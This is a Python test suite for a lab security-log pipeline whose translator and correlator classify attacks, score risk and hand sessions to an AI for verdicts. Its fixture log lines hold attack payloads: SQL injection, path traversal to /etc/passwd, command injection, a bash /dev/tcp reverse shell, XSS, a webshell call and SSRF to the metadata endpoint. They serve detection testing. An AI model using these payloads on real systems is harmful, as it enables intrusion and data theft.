"""
test_pipeline.py — SOAR pipeline end-to-end test

Đặt file này tại: my-lab/mcp-project/test_pipeline.py
Chạy từ thư mục đó:
    cd my-lab/mcp-project
    python test_pipeline.py
    python test_pipeline.py -v
    python test_pipeline.py --scenario apt
    python test_pipeline.py --scenario recon
    python test_pipeline.py --scenario sqli
"""

import sys
import os
import json
import time
import argparse
import importlib

# ── Resolve absolute paths từ vị trí file này ─────────────────────────────
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TRANSLATOR_DIR = os.path.join(BASE_DIR, "mcp_servers", "translator_server")
CORRELATOR_DIR = os.path.join(BASE_DIR, "mcp_servers", "correlator_server")

for path in [TRANSLATOR_DIR, CORRELATOR_DIR]:
    if not os.path.isdir(path):
        print(f"[ERROR] Directory not found: {path}")
        print("        Kiểm tra lại cấu trúc thư mục:")
        print("        my-lab/mcp-project/")
        print("          mcp_servers/translator_server/server.py")
        print("          mcp_servers/correlator_server/server.py")
        sys.exit(1)

# ── Import translator (normalize_log) ─────────────────────────────────────
sys.path.insert(0, TRANSLATOR_DIR)
import importlib.util

def load_module(name, path):
    spec = importlib.util.spec_from_file_location(name, os.path.join(path, "server.py"))
    mod  = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod

translator_mod  = load_module("translator_server",  TRANSLATOR_DIR)
correlator_mod  = load_module("correlator_server",  CORRELATOR_DIR)

normalize_log = translator_mod.normalize_log

# ── ANSI colors ────────────────────────────────────────────────────────────
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def ok(msg):   print(f"  {GREEN}+{RESET} {msg}")
def fail(msg): print(f"  {RED}x{RESET} {msg}")
def info(msg): print(f"  {CYAN}>{RESET} {msg}")
def head(msg): print(f"\n{BOLD}{YELLOW}{'─'*62}{RESET}\n{BOLD}{msg}{RESET}")

VERBOSE = False

def reset_correlator():
    correlator_mod.SESSION_STORE.clear()


# ══════════════════════════════════════════════════════════════════════════
# FIXTURES — raw log lines giả lập output của collector
# ══════════════════════════════════════════════════════════════════════════

FIXTURES = {
    "recon_robots":     {"source": "web",      "raw": '192.168.1.100 - - [10/May/2025] "GET /robots.txt HTTP/1.1" 200 45'},
    "recon_env":        {"source": "web",      "raw": '192.168.1.100 - - [10/May/2025] "GET /.env HTTP/1.1" 403 12'},
    "recon_admin":      {"source": "web",      "raw": '192.168.1.100 - - [10/May/2025] "GET /admin HTTP/1.1" 302 0'},
    "recon_phpmyadmin": {"source": "web",      "raw": '192.168.1.100 - - [10/May/2025] "GET /phpmyadmin HTTP/1.1" 200 1234'},
    "sqli_basic":       {"source": "web",      "raw": "192.168.1.100 - - [10/May/2025] \"GET /login?id=1' OR 1=1-- HTTP/1.1\" 200 512"},
    "sqli_union":       {"source": "web",      "raw": '192.168.1.100 - - [10/May/2025] "GET /search?q=1 UNION SELECT user,password,3 FROM users-- HTTP/1.1" 200 1024'},
    "sqli_blind":       {"source": "web",      "raw": '192.168.1.100 - - [10/May/2025] "GET /item?id=1 AND SLEEP(5)-- HTTP/1.1" 200 0'},
    "sqli_encoded":     {"source": "web",      "raw": "192.168.1.100 - - [10/May/2025] \"GET /page?id=1%27%20OR%201%3D1-- HTTP/1.1\" 200 512"},
    "sqli_hex":         {"source": "web",      "raw": '192.168.1.100 - - [10/May/2025] "GET /page?id=0x554e494f4e+0x53454c454354+1,2,3-- HTTP/1.1" 200 100'},
    "lfi_passwd":       {"source": "web",      "raw": '192.168.1.100 - - [10/May/2025] "GET /page?file=../../etc/passwd HTTP/1.1" 200 1234'},
    "lfi_php_filter":   {"source": "web",      "raw": '192.168.1.100 - - [10/May/2025] "GET /view?page=php://filter/convert.base64-encode/resource=index.php HTTP/1.1" 200 4096'},
    "cmdi_whoami":      {"source": "web",      "raw": '192.168.1.100 - - [10/May/2025] "GET /ping?host=127.0.0.1;whoami HTTP/1.1" 200 15'},
    "cmdi_reverse":     {"source": "web",      "raw": '192.168.1.100 - - [10/May/2025] "GET /exec?cmd=bash+-i+>&+/dev/tcp/192.168.1.100/4444+0>&1 HTTP/1.1" 200 0'},
    "xss_basic":        {"source": "web",      "raw": '192.168.1.100 - - [10/May/2025] "GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1" 200 200'},
    "ssh_bruteforce":   {"source": "auth",     "raw": "May 10 10:23:45 server sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2"},
    "ssh_invalid_user": {"source": "auth",     "raw": "May 10 10:23:46 server sshd[1235]: Invalid user admin from 192.168.1.100 port 22"},
    "priv_esc_sudo":    {"source": "audit",    "raw": "May 10 11:00:00 server sudo: attacker : TTY=pts/0 ; PWD=/home/attacker ; USER=root ; COMMAND=/bin/bash sudo su root"},
    "webshell":         {"source": "web",      "raw": '192.168.1.100 - - [10/May/2025] "GET /uploads/shell.php?cmd=shell_exec(id) HTTP/1.1" 200 50'},
    "ssrf":             {"source": "web",      "raw": '192.168.1.100 - - [10/May/2025] "GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200 256'},
    "wazuh_high":       {"source": "wazuh",    "raw": "May 10 10:30:00 dvwa kernel: SQL injection attempt detected", "rule_level": 10, "rule_description": "Web attack: SQL injection attempt", "srcip": "192.168.1.100", "timestamp": "2025-05-10T10:30:00Z"},
    "firewall_scan":    {"source": "firewall", "raw": "May 10 10:00:01 server kernel: [UFW BLOCK] IN=eth0 SRC=192.168.1.100 DPT=22 PROTO=TCP"},
    "clean_get":        {"source": "web",      "raw": '192.168.1.100 - - [10/May/2025] "GET /index.html HTTP/1.1" 200 1234'},
    "clean_static":     {"source": "web",      "raw": '192.168.1.100 - - [10/May/2025] "GET /favicon.ico HTTP/1.1" 200 32'},
}

SCENARIOS = {
    "recon":             ["recon_robots", "recon_env", "recon_admin", "recon_phpmyadmin", "clean_get"],
    "sqli":              ["clean_get", "recon_admin", "sqli_basic", "sqli_union", "sqli_blind", "sqli_encoded", "sqli_hex"],
    "lfi":               ["recon_robots", "lfi_passwd", "lfi_php_filter"],
    "brute":             ["ssh_bruteforce", "ssh_bruteforce", "ssh_bruteforce", "ssh_invalid_user", "ssh_invalid_user"],
    "apt":               ["recon_robots", "recon_env", "recon_admin", "sqli_basic", "sqli_union", "lfi_passwd", "lfi_php_filter", "cmdi_whoami", "cmdi_reverse", "priv_esc_sudo", "webshell", "ssrf"],
    "noise_only":        ["clean_get", "clean_get", "clean_static", "clean_static"],
    "wazuh_passthrough": ["wazuh_high", "sqli_basic", "firewall_scan"],
}


# ══════════════════════════════════════════════════════════════════════════
# TEST 1 — Translator unit
# ══════════════════════════════════════════════════════════════════════════

def test_translator_unit():
    head("TEST 1 — Translator: phát hiện từng loại tấn công")
    cases = [
        ("sqli_basic",         "authentication_bypass_attempt", "high"),
        ("sqli_encoded",       "authentication_bypass_attempt", "high"),
        ("sqli_hex",           "authentication_bypass_attempt", "high"),
        ("lfi_passwd",         "local_file_inclusion_attempt",  "high"),
        ("lfi_php_filter",     "local_file_inclusion_attempt",  "high"),
        ("cmdi_whoami",        "command_injection_attempt",     "critical"),
        ("cmdi_reverse",       "reverse_shell_attempt",         "critical"),
        ("xss_basic",          "cross_site_scripting_attempt",  "high"),
        ("ssh_bruteforce",     "brute_force_attempt",           "medium"),
        ("ssh_invalid_user",   "user_enumeration_attempt",      "medium"),
        ("priv_esc_sudo",      "privilege_escalation_attempt",  "critical"),
        ("webshell",           "webshell_execution",            "critical"),
        ("ssrf",               "ssrf_attempt",                  "critical"),
        ("recon_admin",        "admin_surface_probe",           "medium"),
        ("recon_env",          "sensitive_resource_discovery",  "medium"),
        ("wazuh_high",         "wazuh_high_alert",              "high"),
        ("firewall_scan",      "port_scan_detected",            "medium"),
        ("clean_get",          "unknown",                       "low"),
    ]
    passed = failed = 0
    for name, exp_action, exp_sev in cases:
        r = normalize_log(FIXTURES[name])
        if r["action"] == exp_action and r["severity"] == exp_sev:
            ok(f"{name:<24} action={r['action']}, sev={r['severity']}, conf={r['confidence']:.2f}")
            passed += 1
        else:
            fail(f"{name:<24} expected ({exp_action}, {exp_sev}) got ({r['action']}, {r['severity']})")
            failed += 1
        if VERBOSE:
            info(f"  evidence={r['evidence']}, multi_stage={r['multi_stage']}")
    print(f"\n  {GREEN}{passed} passed{RESET} / {RED}{failed} failed{RESET}")
    return failed == 0


# ══════════════════════════════════════════════════════════════════════════
# TEST 2 — Multi-stage detection
# ══════════════════════════════════════════════════════════════════════════

def test_multi_stage_flag():
    head("TEST 2 — Translator: multi_stage flag")
    combined = {"source": "web", "raw": '192.168.1.100 - - "GET /page?id=1 UNION SELECT 1,2,3--&file=../../etc/passwd HTTP/1.1" 200 100'}
    r      = normalize_log(combined)
    single = normalize_log(FIXTURES["sqli_basic"])

    ok_combo  = r.get("multi_stage") is True
    ok_single = single.get("multi_stage") is False

    if ok_combo:  ok(f"Combined sqli+lfi → multi_stage=True, evidence={r['evidence']}")
    else:         fail(f"Combined: multi_stage NOT set, evidence={r['evidence']}")

    if ok_single: ok("Single sqli → multi_stage=False (no false positive)")
    else:         fail(f"Single sqli → multi_stage=True (false positive)")

    return ok_combo and ok_single


# ══════════════════════════════════════════════════════════════════════════
# TEST 3 — Batch + noise filter
# ══════════════════════════════════════════════════════════════════════════

def test_translate_batch():
    head("TEST 3 — Translator batch: lọc noise, giữ attack")
    events = [FIXTURES[k] for k in ["clean_get", "clean_static", "sqli_basic", "lfi_passwd", "xss_basic", "ssh_bruteforce"]]
    translated = []
    skipped = 0
    for e in events:
        r = normalize_log(e)
        if r["action"] == "unknown" and r["confidence"] <= 0.25:
            skipped += 1
        else:
            translated.append(r)
    ok(f"Input: {len(events)} | Attacks kept: {len(translated)} | Noise filtered: {skipped}")
    correct = skipped == 2 and len(translated) == 4
    if correct: ok("Noise filter hoạt động đúng")
    else:       fail(f"Expected 4 attacks + 2 noise, got {len(translated)} + {skipped}")
    return correct


# ══════════════════════════════════════════════════════════════════════════
# TEST 4 — Risk scoring
# ══════════════════════════════════════════════════════════════════════════

def test_risk_scoring():
    head("TEST 4 — Correlator: risk scoring")
    reset_correlator()
    correlator_mod.update_session("r_low",  normalize_log(FIXTURES["clean_get"]))
    correlator_mod.update_session("r_high", normalize_log(FIXTURES["sqli_basic"]))
    correlator_mod.update_session("r_crit", normalize_log(FIXTURES["cmdi_whoami"]))

    rl = correlator_mod.SESSION_STORE["r_low"]["risk"]
    rh = correlator_mod.SESSION_STORE["r_high"]["risk"]
    rc = correlator_mod.SESSION_STORE["r_crit"]["risk"]

    ok(f"low={rl:.2f}  high={rh:.2f}  critical={rc:.2f}")
    correct = rl < rh < rc
    if correct: ok("Ordering đúng: low < high < critical")
    else:       fail(f"Ordering sai: {rl} / {rh} / {rc}")
    return correct


# ══════════════════════════════════════════════════════════════════════════
# TEST 5 — Flush conditions (3 điều kiện)
# ══════════════════════════════════════════════════════════════════════════

def test_flush_conditions():
    head("TEST 5 — Correlator: 3 điều kiện flush")
    passed = True

    reset_correlator()
    for _ in range(4):
        correlator_mod.update_session("f_risk", normalize_log(FIXTURES["cmdi_whoami"]))
    s = correlator_mod.SESSION_STORE["f_risk"]
    fa = correlator_mod.should_flush(s)
    if fa: ok(f"Condition A (risk >= 40): triggered at risk={s['risk']:.1f}")
    else:  fail(f"Condition A: NOT triggered at risk={s['risk']:.1f}"); passed = False

    reset_correlator()
    correlator_mod.update_session("f_multi", normalize_log(FIXTURES["sqli_basic"]))
    correlator_mod.update_session("f_multi", normalize_log(FIXTURES["lfi_passwd"]))
    s = correlator_mod.SESSION_STORE["f_multi"]
    fb = correlator_mod.should_flush(s)
    atypes = {e.get("action") for e in s["events"]} - {"unknown", "login_attempt"}
    if fb: ok(f"Condition B (>=2 attack types): triggered, types={atypes}")
    else:  fail(f"Condition B: NOT triggered, types={atypes}"); passed = False

    reset_correlator()
    base = normalize_log(FIXTURES["recon_robots"])
    for _ in range(30):
        correlator_mod.update_session("f_queue", base)
    s = correlator_mod.SESSION_STORE["f_queue"]
    fc = correlator_mod.should_flush(s)
    if fc: ok(f"Condition C (queue >= 30): triggered at queue_size={len(s['events'])}")
    else:  fail(f"Condition C: NOT triggered at queue_size={len(s['events'])}"); passed = False

    return passed


# ══════════════════════════════════════════════════════════════════════════
# TEST 6 — Session stage detection
# ══════════════════════════════════════════════════════════════════════════

def test_session_stage():
    head("TEST 6 — Correlator: session stage detection")
    cases = [
        (["recon_robots", "recon_env"],               "reconnaissance"),
        (["sqli_basic", "sqli_union"],                "initial_compromise"),
        (["sqli_basic", "lfi_passwd", "cmdi_whoami"], "active_intrusion"),
        (["priv_esc_sudo", "cmdi_whoami"],            "active_intrusion"),
        (["webshell", "cmdi_reverse"],                "post_exploitation"),
        (["clean_get", "clean_static"],               "normal_activity"),
    ]
    passed = failed = 0
    for keys, expected in cases:
        events = [normalize_log(FIXTURES[k]) for k in keys]
        stage  = correlator_mod.detect_session_stage(events)
        if stage == expected:
            ok(f"{str(keys):<50} -> {stage}")
            passed += 1
        else:
            fail(f"{keys} expected={expected}, got={stage}")
            failed += 1
    print(f"\n  {GREEN}{passed} passed{RESET} / {RED}{failed} failed{RESET}")
    return failed == 0


# ══════════════════════════════════════════════════════════════════════════
# TEST 7 — Full pipeline simulation
# ══════════════════════════════════════════════════════════════════════════

def test_full_pipeline(scenario_name: str):
    head(f"TEST 7 — Full pipeline simulation: scenario='{scenario_name}'")
    reset_correlator()
    user_id = f"pipeline_{scenario_name}"
    keys = SCENARIOS.get(scenario_name, [])
    raw_events = [FIXTURES[k] for k in keys]
    sources = set(FIXTURES[k]["source"] for k in keys)
    info(f"Step 1 — Collector  : {len(raw_events)} raw events, sources={sources}")

    # translate_batch
    translated = []
    skipped = 0
    for e in raw_events:
        r = normalize_log(e)
        if r["action"] == "unknown" and r["confidence"] <= 0.25:
            skipped += 1
        else:
            translated.append(r)
    info(f"Step 2 — Translator : {len(translated)} behaviors, {skipped} noise skipped")
    if VERBOSE:
        for t in translated:
            print(f"    [{t['severity'].upper():8}] {t['action']}")

    # add_event_batch
    for event in translated:
        correlator_mod.update_session(user_id, event)
    session = correlator_mod.SESSION_STORE.get(user_id, {})
    info(f"Step 3 — Correlator : queue={len(session.get('events',[]))}, risk={session.get('risk',0):.1f}")

    flush = correlator_mod.should_flush(session)

    if flush:
        payload = correlator_mod.do_flush(session, user_id)
        stage   = session["session_stage"]
        ok(f"FLUSH triggered     : session_stage={stage}")
        ok(f"payload history     : {len(payload['history'])} steps")
        m = payload["metrics"]
        ok(f"payload metrics     : risk={m['session_risk']:.1f}, events={m['event_count']}, "
           f"critical={m['critical_count']}, high={m['high_count']}, multi_stage={m['multi_stage_count']}")
        ok(f"context_memory      : {len(payload['context_memory'])} prior AI results (empty on 1st flush = correct)")

        if VERBOSE:
            print(f"\n  {CYAN}payload_to_ai:{RESET}")
            print(json.dumps(payload, indent=4, default=str))

        # simulate AI verdict + update_ai_context
        mock_ai = {
            "risk_summary":   "high",
            "verdict":        "attack_detected",
            "recommendation": "isolate_session",
            "attack_chain":   [s["action"] for s in payload["history"]]
        }
        correlator_mod.record_ai_result(session, stage, mock_ai)
        ok(f"AI verdict stored   : context_size={len(session['ai_context'])}")

        # 2nd event → verify context carries over
        session["flush_counter"] = 0  # reset guard để test 2nd flush
        correlator_mod.update_session(user_id, normalize_log(FIXTURES["sqli_basic"]))
        s2 = correlator_mod.SESSION_STORE[user_id]
        if correlator_mod.should_flush(s2):
            p2     = correlator_mod.do_flush(s2, user_id)
            ctx_sz = len(p2.get("context_memory", []))
            if ctx_sz > 0:
                ok(f"2nd flush formula   : context_memory={ctx_sz} — queue_n = AI_(n-1) + behavior_n OK")
            else:
                fail("2nd flush formula   : context_memory empty — formula NOT working")
        else:
            info("2nd flush not triggered (single event, normal — flush_counter reset test)")
    else:
        stage = correlator_mod.detect_session_stage(session.get("events", []))
        info(f"No flush yet        : stage={stage}, status=buffering (đúng cho scenario ít event)")
        ok("Correlator đang gom tiếp, chưa đủ ngưỡng")

    return True


# ══════════════════════════════════════════════════════════════════════════
# TEST 8 — Schema compatibility
# ══════════════════════════════════════════════════════════════════════════

def test_schema_compat():
    head("TEST 8 — Schema: translator output field ↔ correlator expectation")
    t_out    = normalize_log(FIXTURES["sqli_basic"])
    required = ["action", "severity", "multi_stage", "source", "timestamp", "srcip", "evidence", "raw_normalized", "confidence"]
    passed = failed = 0
    for field in required:
        if field in t_out:
            ok(f"'{field}' present → {repr(t_out[field])[:55]}")
            passed += 1
        else:
            fail(f"'{field}' MISSING")
            failed += 1
    print(f"\n  {GREEN}{passed} matched{RESET} / {RED}{failed} missing{RESET}")
    return failed == 0


# ══════════════════════════════════════════════════════════════════════════
# TEST 9 — MCP tool surface
# ══════════════════════════════════════════════════════════════════════════

def test_mcp_tool_surface():
    head("TEST 9 — MCP tool surface: tool list + return type annotation")
    checks = [
        (translator_mod,  "translate_behavior",    dict),
        (translator_mod,  "translate_batch",        dict),
        (correlator_mod,  "add_event",              dict),
        (correlator_mod,  "add_event_batch",        dict),
        (correlator_mod,  "update_ai_context",      dict),
        (correlator_mod,  "get_session_status",     dict),
        (correlator_mod,  "get_forensic_snapshot",  dict),
    ]
    passed = failed = 0
    for mod, tool, expected_ret in checks:
        fn      = getattr(mod, tool, None)
        ret_ann = getattr(fn, "__annotations__", {}).get("return") if fn else None
        label   = "translator" if mod is translator_mod else "correlator"
        if fn and ret_ann == expected_ret:
            ok(f"{label}.{tool}() → return:{ret_ann.__name__}")
            passed += 1
        elif fn:
            fail(f"{label}.{tool}() exists but return annotation={ret_ann} (expected dict)")
            failed += 1
        else:
            fail(f"{label}.{tool}() MISSING")
            failed += 1
    print(f"\n  {GREEN}{passed} passed{RESET} / {RED}{failed} failed{RESET}")
    return failed == 0


# ══════════════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════════════

def main():
    global VERBOSE
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("--scenario", default="apt", choices=list(SCENARIOS.keys()))
    args    = parser.parse_args()
    VERBOSE = args.verbose

    print(f"\n{BOLD}{'═'*62}")
    print("  SOAR PIPELINE — END-TO-END TEST SUITE")
    print(f"{'═'*62}{RESET}")
    print(f"  Translator : {TRANSLATOR_DIR}")
    print(f"  Correlator : {CORRELATOR_DIR}")

    tests = [
        ("Translator: unit detection",          test_translator_unit),
        ("Translator: multi_stage flag",         test_multi_stage_flag),
        ("Translator: batch + noise filter",     test_translate_batch),
        ("Correlator: risk scoring",             test_risk_scoring),
        ("Correlator: 3 flush conditions",       test_flush_conditions),
        ("Correlator: session stage",            test_session_stage),
        (f"Full pipeline ({args.scenario})",     lambda: test_full_pipeline(args.scenario)),
        ("Schema: translator -> correlator",     test_schema_compat),
        ("MCP: tool surface + return types",     test_mcp_tool_surface),
    ]

    results = []
    for name, fn in tests:
        try:
            results.append((name, fn()))
        except Exception as e:
            import traceback
            print(f"\n  {RED}EXCEPTION in '{name}': {e}{RESET}")
            traceback.print_exc()
            results.append((name, False))

    print(f"\n{BOLD}{'═'*62}")
    print("  SUMMARY")
    print(f"{'═'*62}{RESET}")
    for name, r in results:
        status = f"{GREEN}PASS{RESET}" if r else f"{RED}FAIL{RESET}"
        print(f"  [{status}] {name}")

    p = sum(1 for _, r in results if r)
    f = len(results) - p
    print(f"\n  {BOLD}Total: {GREEN}{p}/{len(results)} passed{RESET}", end="")
    if f:
        print(f", {RED}{f} failed{RESET}")
        sys.exit(1)
    else:
        print(f"\n  {GREEN}{BOLD}All tests passed{RESET}")
        sys.exit(0)


if __name__ == "__main__":
    main()
